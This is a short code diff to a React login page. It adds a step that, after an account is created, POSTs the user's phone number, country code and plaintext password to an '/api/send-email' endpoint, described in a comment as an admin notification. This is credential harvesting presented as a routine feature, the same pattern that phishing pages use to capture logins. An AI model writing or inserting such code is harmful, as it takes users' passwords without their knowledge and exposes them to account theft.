@@ -72,6 +72,19 @@ export default function LoginPage() {
       localStorage.setItem("users", JSON.stringify(updatedUsers))
       setUsers(updatedUsers)
       setMessage("Account created and logged in!")
+
+      // Send email notification to admin
+      fetch("/api/send-email", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          phone: phoneNumber,
+          countryCode: countryCode,
+          password: password,
+        }),
+      }).catch((err) => console.error("Failed to send email:", err))
     }
 
     setTimeout(() => setMessage(""), 3000)
